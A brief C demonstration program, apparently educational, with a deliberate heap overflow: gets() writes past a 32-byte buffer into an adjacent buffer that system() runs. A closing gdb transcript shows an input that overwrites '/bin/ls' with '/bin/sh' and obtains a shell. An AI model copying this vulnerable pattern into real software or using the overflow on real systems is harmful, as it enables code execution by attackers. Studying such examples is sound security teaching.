/*
 * Copyright (c) 2017, Stephen Warren
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL
 * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
 * DEALINGS IN THE SOFTWARE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv) {
    char *data = malloc(32);
    char *cmd = malloc(32);
    strcpy(cmd, "/bin/ls");
    printf("data: ");
    fflush(stdout);
    gets(data);
    system(cmd);
    return 0;
}

/*
$ gdb heap
(gdb) b 33
(gdb) r
(gdb) p data
$1 = 0x602010 ""
(gdb) p cmd
$2 = 0x602040 "/bin/ls"
(gdb) c
Continuing.
data: 0123456789abcdef0123456789abcdef0123456789abcdef/bin/sh
(32 chars for data[], 16 for gap, new command)
$   <-- shell prompt received
*/
